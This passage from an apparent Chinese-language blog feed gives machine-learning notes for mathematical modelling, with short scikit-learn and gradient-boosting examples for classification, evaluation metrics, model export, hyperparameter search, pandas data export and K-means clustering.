<h3 id="SVM"><a href="#SVM" class="headerlink" title="SVM"></a>SVM</h3><h4 id="代码-7"><a href="#代码-7" class="headerlink" title="代码"></a>代码</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn.svm <span class="keyword">import</span> SVC</span><br><span class="line"></span><br><span class="line">estimator = SVC()</span><br><span class="line">estimator.fit(X_train, y_train)</span><br><span class="line">y_predict = estimator.predict(X_test)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Train set score: &quot;</span>, estimator.score(X_train, y_train))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Test set score: &quot;</span>, estimator.score(X_test, y_test))</span><br></pre></td></tr></table></figure>
<h4 id="数据可视化-3"><a href="#数据可视化-3" class="headerlink" title="数据可视化"></a>数据可视化</h4><h3 id="朴素贝叶斯"><a href="#朴素贝叶斯" class="headerlink" title="朴素贝叶斯"></a>朴素贝叶斯</h3><h4 id="代码-8"><a href="#代码-8" class="headerlink" title="代码"></a>代码</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn.naive_bayes <span class="keyword">import</span> GaussianNB</span><br><span class="line"></span><br><span class="line">estimator = GaussianNB()</span><br><span class="line">estimator.fit(X_train, y_train)</span><br><span class="line">y_predict = estimator.predict(X_test)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Train set score: &quot;</span>, estimator.score(X_train, y_train))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Test set score: &quot;</span>, estimator.score(X_test, y_test))</span><br></pre></td></tr></table></figure>
<h4 id="数据可视化-4"><a href="#数据可视化-4" class="headerlink" title="数据可视化"></a>数据可视化</h4><h3 id=""><a href="#" class="headerlink" title=""></a></h3><h2 id="基于GBDT的算法"><a href="#基于GBDT的算法" class="headerlink" title="基于GBDT的算法"></a>基于GBDT的算法</h2><h3 id="XGBoost"><a href="#XGBoost" class="headerlink" title="XGBoost"></a>XGBoost</h3><h4 id="代码-9"><a href="#代码-9" class="headerlink" title="代码"></a>代码</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> xgboost <span class="keyword">import</span> XGBClassifier</span><br><span class="line"></span><br><span class="line">estimator = XGBClassifier()</span><br><span class="line">estimator.fit(X_train, y_train)  </span><br><span class="line">y_predict = estimator.predict(X_test)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Train set score: &quot;</span>, estimator.score(X_train, y_train))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Test set score: &quot;</span>, estimator.score(X_test, y_test))</span><br></pre></td></tr></table></figure>
<h3 id="LightGBM"><a href="#LightGBM" class="headerlink" title="LightGBM"></a>LightGBM</h3><h4 id="代码-10"><a href="#代码-10" class="headerlink" title="代码"></a>代码</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> lightgbm <span class="keyword">import</span> LGBMClassifier</span><br><span class="line"></span><br><span class="line">estimator = LGBMClassifier()</span><br><span class="line">estimator.fit(X_train, y_train)  </span><br><span class="line">y_predict = estimator.predict(X_test)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Train set score: &quot;</span>, estimator.score(X_train, y_train))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Test set score: &quot;</span>, estimator.score(X_test, y_test))</span><br></pre></td></tr></table></figure>
<h3 id="CatBoost"><a href="#CatBoost" class="headerlink" title="CatBoost"></a>CatBoost</h3><h4 id="代码-11"><a href="#代码-11" class="headerlink" title="代码"></a>代码</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> catboost <span class="keyword">import</span> CatBoostClassifier</span><br><span class="line"></span><br><span class="line">estimator =  CatBoostClassifier()</span><br><span class="line">estimator.fit(X_train, y_train)  </span><br><span class="line">y_predict = estimator.predict(X_test)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Train set score: &quot;</span>, estimator.score(X_train, y_train))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Test set score: &quot;</span>, estimator.score(X_test, y_test))</span><br></pre></td></tr></table></figure>

<h2 id="神经网络"><a href="#神经网络" class="headerlink" title="神经网络"></a>神经网络</h2><h4 id="代码-12"><a href="#代码-12" class="headerlink" title="代码"></a>代码</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn.neural_network <span class="keyword">import</span> MLPClassifier</span><br><span class="line"></span><br><span class="line">estimator = MLPClassifier()</span><br><span class="line">estimator.fit(X_train, y_train)  </span><br><span class="line">y_predict = estimator.predict(X_test)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Train set score: &quot;</span>, estimator.score(X_train, y_train))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Test set score: &quot;</span>, estimator.score(X_test, y_test))</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>数学建模</category>
      </categories>
      <tags>
        <tag>数学建模</tag>
        <tag>机器学习</tag>
        <tag>数据处理</tag>
      </tags>
  </entry>
  <entry>
    <title>模型评价与导出</title>
    <url>/2023/03/01/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1/%E6%A8%A1%E5%9E%8B%E8%AF%84%E4%BB%B7%E4%B8%8E%E5%AF%BC%E5%87%BA/</url>
    <content><![CDATA[<h2 id="模型评价"><a href="#模型评价" class="headerlink" title="模型评价"></a>模型评价</h2><h3 id="回归"><a href="#回归" class="headerlink" title="回归"></a>回归</h3><h4 id="MSE-平均平方误差、均方误差"><a href="#MSE-平均平方误差、均方误差" class="headerlink" title="MSE(平均平方误差、均方误差)"></a>MSE(平均平方误差、均方误差)</h4><p><img src="https://cdn.nlark.com/yuque/__latex/b3b54b42194bc3e5855c00856a4b5425.svg#card=math&code=M%20S%20E%3D%5C%20%7B%5Cfrac%7B1%7D%7Bm%7D%7D%5Csum_%7Bi%3D1%7D%5E%7Bm%7D%28f_%7Bi%7D-y_%7Bi%7D%29%5E%7B2%7D&id=DwTmm"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn.metrics <span class="keyword">import</span> mean_squared_error</span><br><span class="line"><span class="built_in">print</span>(mean_squared_error(y_test,y_predict))</span><br></pre></td></tr></table></figure>
<h4 id="RMSE-均方根误差、标准误差）"><a href="#RMSE-均方根误差、标准误差）" class="headerlink" title="RMSE(均方根误差、标准误差）"></a>RMSE(均方根误差、标准误差）</h4><p><img src="https://cdn.nlark.com/yuque/__latex/1f72ee19c67a17243bb29ce5cb3cea56.svg#card=math&code=R%20M%20S%20E%3D%5Csqrt%7B%5Cfrac%7B1%7D%7Bm%7D%5Csum_%7Bi%3D1%7D%5E%7Bm%7D%28f_i-y_%7Bi%7D%29%5E%7B2%7D%7D&id=zMFK6"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> sklearn.metrics <span class="keyword">import</span> mean_squared_error</span><br><span class="line"><span class="built_in">print</span>(np.sqrt(mean_squared_error(y_test,y_predict)))</span><br></pre></td></tr></table></figure>
<h4 id="MAE-平均绝对误差）"><a href="#MAE-平均绝对误差）" class="headerlink" title="MAE(平均绝对误差）"></a>MAE(平均绝对误差）</h4><p><img src="https://cdn.nlark.com/yuque/__latex/b866064ddf5ed8c0c9916558c9b32d1e.svg#card=math&code=%0AM%20A%20E%3D%7B%5Cfrac%7B1%7D%7Bm%7D%7D%5Csum_%7Bi%3D1%7D%5E%7Bm%7D%7Cf_%7Bi%7D-y_%7Bi%7D%7C&id=olhF7"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn.metrics <span class="keyword">import</span> mean_absolute_error</span><br><span class="line"><span class="built_in">print</span>(mean_absolute_error(y_test,y_predict))</span><br></pre></td></tr></table></figure>
<h4 id="R2-score"><a href="#R2-score" class="headerlink" title="R2_score"></a>R2_score</h4><p>R Squared又叫可决系数(coefficient of determination)也叫拟合优度,反映的是自变量x对因变量y的变动的解释的程度.越接近于1,说明模型拟合得越好.<br><img src="https://cdn.nlark.com/yuque/__latex/2abfe1c20f83fd845ea69b79430c2646.svg#card=math&code=R%5E%7B2%7D%3D1-%5Cfrac%7B%5Csum_%7Bi%3D1%7D%5E%7Bm%7D%28f_%7Bi%7D-y_%7Bi%7D%29%5E%7Bz%7D%7D%7B%5Csum_%7Bi%3D1%7D%5E%7Bm%7D%28%5Coverline%7B%7By_%7Bi%7D%7D%7D-y_%7Bi%7D%29%5E%7Bz%7D%7D&id=lswUN"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn.metrics <span class="keyword">import</span> r2_score</span><br><span class="line"><span class="built_in">print</span>(r2_score(y_test,y_predict))</span><br></pre></td></tr></table></figure>
<h3 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h3><h4 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h4><p>针对一个二分类问题，即将实例分成正类（positive）或负类（negative），在实际分类中会出现以下四种情况：</p>
<ol>
<li>若一个实例是正类，并且被预测为正类，即为真正类(True Positive TP)</li>
<li>若一个实例是正类，但是被预测为负类，即为假负类(False Negative FN)</li>
<li>若一个实例是负类，但是被预测为正类，即为假正类(False Positive FP)</li>
<li>若一个实例是负类，并且被预测为负类，即为真负类(True Negative TN)</li>
</ol>
<h4 id="准确率"><a href="#准确率" class="headerlink" title="准确率"></a>准确率</h4><p>定义：对于给定的测试数据集，分类器正确分类的样本数与总样本数之比。<br><img src="https://cdn.nlark.com/yuque/__latex/3f3e5c08c246d343b93701f36792d0c0.svg#card=math&code=A%20c%20c%20u%20r%20a%20c%20y%3D%7B%5Cfrac%7BT%20P%2BT%20N%7D%7BT%20P%2BT%20N%2BF%20P%2BF%20N%7D%7D&id=eYC4l"><br>缺点：在正负样本不平衡的情况下，这个指标有很大的缺陷。例如：给定一组测试样本共1100个实例，其中1000个是负类，剩余100个是正类。即使分类模型将所有实例均预测为负类，Accuracy也有90%以上，这样就没什么意义了。</p>
<h4 id="精确率-Precision"><a href="#精确率-Precision" class="headerlink" title="精确率(Precision)"></a>精确率(Precision)</h4><p>定义：精确率是检索出相关文档数与检索出的文档总数的比率（正确分类的正例个数占分类为正例的实例个数的比例），衡量的是检索系统的查准率。<br><img src="https://cdn.nlark.com/yuque/__latex/b8b657c8e560bf68413139017bcc5326.svg#card=math&code=p%20r%20e%20c%20i%20s%20i%20o%20n%3D%7B%5Cfrac%7BT%20P%7D%7BT%20P%2BF%20P%7D%7D&id=ySZZ3"></p>
<h4 id="召回率-Recall"><a href="#召回率-Recall" class="headerlink" title="召回率(Recall)"></a>召回率(Recall)</h4><p>召回率是指检索出的相关文档数和文档库中所有的相关文档数的比率（正确分类的正例个数占实际正例个数的比例），衡量的是检索系统的查全率。<br><img src="https://cdn.nlark.com/yuque/__latex/c3a69d37ecc735a42e1123ccf4614a55.svg#card=math&code=%0Ar%20e%20c%20a%20l%20l%3D%7B%5Cfrac%7BT%20P%7D%7BT%20P%2BF%20N%7D%7D&id=sMOIx"></p>
<h4 id="F1-score"><a href="#F1-score" class="headerlink" title="F1-score"></a>F1-score</h4><p>为了能够评价不同算法优劣，在Precision和Recall的基础上提出了F1值的概念，来对Precision和Recall进行整体评价，用于反应模型的健壮性。F1的定义如下：<br><img src="https://cdn.nlark.com/yuque/__latex/c4be78c70bd1e25002c3b32eba49cf43.svg#card=math&code=F1%3D%20%5Cfrac%7Bprecision%2A%20recall%2A2%7D%7Bprecision%20%2B%20recall%7D&id=uU0j2"></p>
<h4 id="计算指标的代码"><a href="#计算指标的代码" class="headerlink" title="计算指标的代码"></a>计算指标的代码</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn.metrics <span class="keyword">import</span> classification_report</span><br><span class="line"></span><br><span class="line">report = classification_report(y_test, y_predict, labels=[<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>], </span><br><span class="line">                               target_names=[<span class="string">&#x27;setosa&#x27;</span>, <span class="string">&#x27;versicolor&#x27;</span>, <span class="string">&#x27;virginica&#x27;</span>])</span><br><span class="line"><span class="built_in">print</span>(report)</span><br></pre></td></tr></table></figure>
<h4 id="ROC和AUC"><a href="#ROC和AUC" class="headerlink" title="ROC和AUC"></a>ROC和AUC</h4><p><img src="https://cdn.nlark.com/yuque/0/2023/png/29247769/1677935854334-5c85702f-23fe-4052-b590-d238f7c712dd.png#averageHue=%23f9f9f9&from=url&id=o16Bg&originHeight=992&originWidth=986&originalType=binary&ratio=1.3499999046325684&rotation=0&showTitle=false&status=done&style=none&title="><br><img src="https://cdn.nlark.com/yuque/0/2023/png/29247769/1677935878158-48e6fd73-46da-4919-bd3d-b3423b58f88c.png#averageHue=%23f1f1f1&from=url&id=CbL2b&originHeight=484&originWidth=1005&originalType=binary&ratio=1.3499999046325684&rotation=0&showTitle=false&status=done&style=none&title="></p>
<h4 id="计算AUC"><a href="#计算AUC" class="headerlink" title="计算AUC"></a>计算AUC</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn.metrics <span class="keyword">import</span> roc_auc_score</span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算AUC指标</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(np.unique(y_test)) == <span class="number">2</span>:</span><br><span class="line">    <span class="comment"># 二分类问题</span></span><br><span class="line">    auc = roc_auc_score(y_test, y_predict)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="comment"># 多分类问题，使用“一对多”策略</span></span><br><span class="line">    auc = roc_auc_score(y_test, estimator.predict_proba(X_test), multi_class=<span class="string">&#x27;ovr&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出AUC值</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;AUC score:&#x27;</span>, auc)</span><br></pre></td></tr></table></figure>
<h3 id="ROC曲线可视化"><a href="#ROC曲线可视化" class="headerlink" title="ROC曲线可视化"></a>ROC曲线可视化</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 预测测试集中每个样本的概率</span></span><br><span class="line">y_score = estimator.predict_proba(X_test)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将每个类别的概率转换为二元标签</span></span><br><span class="line">y_test_bin = label_binarize(y_test, classes=[<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>])</span><br><span class="line">n_classes = y_test_bin.shape[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算每个类别的ROC曲线和AUC指标</span></span><br><span class="line">fpr = <span class="built_in">dict</span>()</span><br><span class="line">tpr = <span class="built_in">dict</span>()</span><br><span class="line">roc_auc = <span class="built_in">dict</span>()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n_classes):</span><br><span class="line">    fpr[i], tpr[i], _ = roc_curve(y_test_bin[:, i], y_score[:, i])</span><br><span class="line">    roc_auc[i] = auc(fpr[i], tpr[i])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算平均ROC曲线和AUC指标</span></span><br><span class="line">fpr[<span class="string">&quot;micro&quot;</span>], tpr[<span class="string">&quot;micro&quot;</span>], _ = roc_curve(y_test_bin.ravel(), y_score.ravel())</span><br><span class="line">roc_auc[<span class="string">&quot;micro&quot;</span>] = auc(fpr[<span class="string">&quot;micro&quot;</span>], tpr[<span class="string">&quot;micro&quot;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 绘制每个类别的ROC曲线</span></span><br><span class="line">plt.figure()</span><br><span class="line">lw = <span class="number">2</span></span><br><span class="line">colors = [<span class="string">&#x27;blue&#x27;</span>, <span class="string">&#x27;red&#x27;</span>, <span class="string">&#x27;green&#x27;</span>]</span><br><span class="line"><span class="keyword">for</span> i, color <span class="keyword">in</span> <span class="built_in">zip</span>(<span class="built_in">range</span>(n_classes), colors):</span><br><span class="line">    plt.plot(fpr[i], tpr[i], color=color, lw=lw,</span><br><span class="line">             label=<span class="string">&#x27;ROC curve of class &#123;0&#125; (AUC = &#123;1:0.2f&#125;)&#x27;</span></span><br><span class="line">             <span class="string">&#x27;&#x27;</span>.<span class="built_in">format</span>(i, roc_auc[i]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 绘制平均ROC曲线</span></span><br><span class="line">plt.plot(fpr[<span class="string">&quot;micro&quot;</span>], tpr[<span class="string">&quot;micro&quot;</span>],</span><br><span class="line">         label=<span class="string">&#x27;micro-average ROC curve (AUC = &#123;0:0.2f&#125;)&#x27;</span></span><br><span class="line">         <span class="string">&#x27;&#x27;</span>.<span class="built_in">format</span>(roc_auc[<span class="string">&quot;micro&quot;</span>]),</span><br><span class="line">         color=<span class="string">&#x27;deeppink&#x27;</span>, linestyle=<span class="string">&#x27;:&#x27;</span>, linewidth=<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 添加其他图形元素</span></span><br><span class="line">plt.plot([<span class="number">0</span>, <span class="number">1</span>], [<span class="number">0</span>, <span class="number">1</span>], <span class="string">&#x27;k--&#x27;</span>, lw=lw)</span><br><span class="line">plt.xlim([<span class="number">0.0</span>, <span class="number">1.0</span>])</span><br><span class="line">plt.ylim([<span class="number">0.0</span>, <span class="number">1.05</span>])</span><br><span class="line">plt.xlabel(<span class="string">&#x27;False Positive Rate&#x27;</span>)</span><br><span class="line">plt.ylabel(<span class="string">&#x27;True Positive Rate&#x27;</span>)</span><br><span class="line">plt.title(<span class="string">&#x27;ROC curve for multi-class classification&#x27;</span>)</span><br><span class="line">plt.legend(loc=<span class="string">&quot;lower right&quot;</span>)</span><br><span class="line">plt.show()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="模型导出"><a href="#模型导出" class="headerlink" title="模型导出"></a>模型导出</h2><h3 id="模型导出-1"><a href="#模型导出-1" class="headerlink" title="模型导出"></a>模型导出</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> joblib</span><br><span class="line"></span><br><span class="line">joblib.dump(estimator, <span class="string">&quot;*.pkl&quot;</span>)</span><br></pre></td></tr></table></figure>
<h3 id="模型导入"><a href="#模型导入" class="headerlink" title="模型导入"></a>模型导入</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> joblib</span><br><span class="line"></span><br><span class="line">estimator= joblib.load(<span class="string">&quot;*.pkl&quot;</span>)</span><br></pre></td></tr></table></figure>
<h2 id="模型调整"><a href="#模型调整" class="headerlink" title="模型调整"></a>模型调整</h2><h3 id="网格搜索"><a href="#网格搜索" class="headerlink" title="网格搜索"></a>网格搜索</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">param_dict = &#123;</span><br><span class="line">    <span class="string">&quot;max_depth&quot;</span>: <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">10</span>),</span><br><span class="line">    <span class="string">&quot;n_estimators&quot;</span>:<span class="built_in">range</span>(<span class="number">100</span>,<span class="number">1000</span>,<span class="number">200</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> sklearn.model_selection <span class="keyword">import</span> GridSearchCV</span><br><span class="line">grid_search = GridSearchCV(estimator, param_grid=param_dict, cv=<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">grid_search.fit(X_train, y_train)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 模型最好参数</span></span><br><span class="line">grid_search.best_params_</span><br><span class="line"><span class="comment"># 模型最好评分</span></span><br><span class="line">grid_search.best_score_</span><br><span class="line"><span class="comment"># 最好模型的实例对象</span></span><br><span class="line">grid_search.best_estimator_</span><br><span class="line"><span class="comment"># 交叉验证的结果</span></span><br><span class="line">grid_search.cv_results_</span><br></pre></td></tr></table></figure>
<h3 id="随机网格搜索"><a href="#随机网格搜索" class="headerlink" title="随机网格搜索"></a>随机网格搜索</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">param_dict = &#123;</span><br><span class="line">    <span class="string">&quot;max_depth&quot;</span>: <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">10</span>),</span><br><span class="line">    <span class="string">&quot;n_estimators&quot;</span>:<span class="built_in">range</span>(<span class="number">100</span>,<span class="number">1000</span>,<span class="number">200</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#RandomizedSearchCV参数说明，estimator设置训练的学习器</span></span><br><span class="line"><span class="comment">#param_dist字典类型，放入参数搜索范围</span></span><br><span class="line"><span class="comment">#scoring = &#x27;neg_log_loss&#x27;，精度评价方式设定为“neg_log_loss“</span></span><br><span class="line"><span class="comment">#n_iter=300，训练300次，数值越大，获得的参数精度越大，但是搜索时间越长</span></span><br><span class="line"><span class="comment">#n_jobs = -1，使用所有的CPU进行训练，默认为1，使用1个CPU</span></span><br><span class="line">grid = RandomizedSearchCV(estimator,param_dist,cv = <span class="number">5</span>,scoring = <span class="string">&#x27;neg_log_loss&#x27;</span>,n_iter=<span class="number">300</span>,n_jobs = -<span class="number">1</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="k折交叉验证"><a href="#k折交叉验证" class="headerlink" title="k折交叉验证"></a>k折交叉验证</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn.model_selection <span class="keyword">import</span> cross_val_score</span><br><span class="line"></span><br><span class="line">cross_val_score(estimator, X, y=<span class="literal">None</span>, *, groups=<span class="literal">None</span>, scoring=<span class="literal">None</span>, </span><br><span class="line">                cv=<span class="literal">None</span>, n_jobs=<span class="literal">None</span>, verbose=<span class="number">0</span>, fit_params=<span class="literal">None</span>, </span><br><span class="line">                pre_dispatch=<span class="string">&quot;2*n_jobs&quot;</span>, error_score=np.nan)</span><br><span class="line"></span><br><span class="line"><span class="comment"># estimator：估计器，也就是模型</span></span><br><span class="line"><span class="comment"># X, y：数据，标签值</span></span><br><span class="line"><span class="comment"># soring：调用的方法</span></span><br><span class="line"><span class="comment"># cv：交叉验证生成器或可迭代的次数</span></span><br><span class="line"><span class="comment"># n_jobs：同时工作的cpu个数（-1代表全部）</span></span><br><span class="line"><span class="comment"># verbose：日志冗长度，int：冗长度，0：不输出训练过程，1：偶尔输出，&gt;1：对每个子模型都输出</span></span><br><span class="line"><span class="comment"># fit_params：传递给估计器的拟合方法的参数</span></span><br><span class="line"><span class="comment"># pre_dispatch：控制并行执行期间调度的作业数量。减少这个数量对于避免在CPU发送更多作业时CPU内存消耗的扩大是有用的。</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="数据的导入与导出"><a href="#数据的导入与导出" class="headerlink" title="数据的导入与导出"></a>数据的导入与导出</h2><h3 id="数据导入"><a href="#数据导入" class="headerlink" title="数据导入"></a>数据导入</h3><h3 id="数据导出"><a href="#数据导出" class="headerlink" title="数据导出"></a>数据导出</h3><h4 id="CSV"><a href="#CSV" class="headerlink" title="CSV"></a>CSV</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"></span><br><span class="line">target = pd.DataFrame(data=y_predict, columns=[<span class="string">&quot;y_pred&quot;</span>])</span><br><span class="line">target.to_csv(<span class="string">&quot;test.csv&quot;</span>, index=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure>
<p><strong>参数</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">另外还可以使用sep参数指定分隔符，columns传入一个序列指定列名，编码用encoding传入。</span><br><span class="line">如果不需要表头，可以将header设为<span class="literal">False</span>。</span><br><span class="line">如果文件较大，可以使用compression进行压缩：</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建一个包含out.csv的压缩文件out.zip</span></span><br><span class="line">compression_opts = <span class="built_in">dict</span>(method=<span class="string">&#x27;zip&#x27;</span>, archive_name=<span class="string">&#x27;out.csv&#x27;</span>)</span><br><span class="line">df.to_csv(<span class="string">&#x27;out.zip&#x27;</span>, index=<span class="literal">False</span>, compression=compression_opts)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="Excel"><a href="#Excel" class="headerlink" title="Excel"></a>Excel</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"> <span class="comment"># 导出，可以指定文件路径</span></span><br><span class="line">df.to_excel(<span class="string">&#x27;path_to_file.xlsx&#x27;</span>)</span><br><span class="line"><span class="comment"># 指定Sheet名，不要索引</span></span><br><span class="line">df.to_excel(<span class="string">&#x27;path_to_file.xlsx&#x27;</span>, sheet_name=<span class="string">&#x27;Sheet1&#x27;</span>, index=<span class="literal">False</span>) </span><br><span class="line"><span class="comment"># 指定索引名，不合并单元格 </span></span><br><span class="line">df.to_excel(<span class="string">&#x27;path_to_file.xlsx&#x27;</span>, index_label=<span class="string">&#x27;label&#x27;</span>, merge_cell=<span class="literal">False</span>) </span><br><span class="line"><span class="comment"># 将多个df分不同sheet导入到一个Excel文件中</span></span><br><span class="line"><span class="keyword">with</span> pd.ExcelWriter(<span class="string">&#x27;path_to_file.xlsx&#x27;</span>) <span class="keyword">as</span> writer:</span><br><span class="line">	df1.to_excel(writer, sheet_name=<span class="string">&#x27;Sheet1&#x27;</span>)</span><br><span class="line">	df2.to_excel(writer, sheet_name=<span class="string">&#x27;Sheet2&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>数学建模</category>
      </categories>
      <tags>
        <tag>数学建模</tag>
        <tag>机器学习</tag>
        <tag>数据处理</tag>
      </tags>
  </entry>
  <entry>
    <title>无监督学习</title>
    <url>/2023/03/01/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1/%E6%97%A0%E7%9B%91%E7%9D%A3%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h2 id="K-means算法"><a href="#K-means算法" class="headerlink" title="K-means算法"></a>K-means算法</h2><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn.cluster <span class="keyword">import</span> KMeans</span><br><span class="line">km = KMeans(n_clusters=<span class="number">3</span>)</span><br><span class="line">km.fit(data)</span><br><span class="line">y_predict = km.predict(data)</span><br><span class="line">y_predict</span><br></pre></td></tr></table></figure>
<h3 id="数据可视化"><a href="#数据可视化" class="headerlink" title="数据可视化"></a>数据可视化</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line">colors = [<span class="string">&#x27;red&#x27;</span>, <span class="string">&#x27;green&#x27;</span>, <span class="string">&#x27;blue&#x27;</span>, <span class="string">&#x27;purple&#x27;</span>, <span class="string">&#x27;orange&#x27;</span>, <span class="string">&#x27;yellow&#x27;</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(k):</span><br><span class="line">    plt.scatter(X[y_predict == i, <span class="number">0</span>], X[y_predict == i, <span class="number">1</span>], c=colors[i], label=<span class="string">&#x27;Cluster %d&#x27;</span> % i)</span><br><span class="line">plt.scatter(km.cluster_centers_[:, <span class="number">0</span>], km.cluster_centers_[:, <span class="number">1</span>], s=<span class="number">100</span>, c=<span class="string">&#x27;black&#x27;</span>, label=<span class="string">&#x27;Centroids&#x27;</span>)</span><br><span class="line">plt.title(<span class="string">&#x27;KMeans Clustering&#x27;</span>)</span><br><span class="line">plt.legend()</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>
<h3 id="模型评价"><a href="#模型评价" class="headerlink" title="模型评价"></a>模型评价</h3><h4 id="手肘法"><a href="#手肘法" class="headerlink" title="手肘法"></a>手肘法</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 手肘法</span></span><br><span class="line"><span class="keyword">from</span> sklearn.datasets <span class="keyword">import</span> load_iris</span><br><span class="line"><span class="keyword">from</span> sklearn.cluster <span class="keyword">import</span> KMeans</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line"><span class="comment"># SSE(sum of the squared errors，误差平方和)</span></span><br><span class="line">SSE = []  <span class="comment"># 存放每次结果的误差平方和</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">9</span>):</span><br><span class="line">    estimator = KMeans(n_clusters=k)  <span class="comment"># 构造聚类器</span></span><br><span class="line">    estimator.fit(data)</span><br><span class="line">    SSE.append(estimator.inertia_) <span class="comment"># estimator.inertia_获取聚类准则的总和</span></span><br><span class="line">X = <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">9</span>)</span><br><span class="line">plt.xlabel(<span class="string">&#x27;k&#x27;</span>)</span><br><span class="line">plt.ylabel(<span class="string">&#x27;SSE&#x27;</span>)</span><br><span class="line">plt.plot(X,SSE,<span class="string">&#x27;o-&#x27;</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>
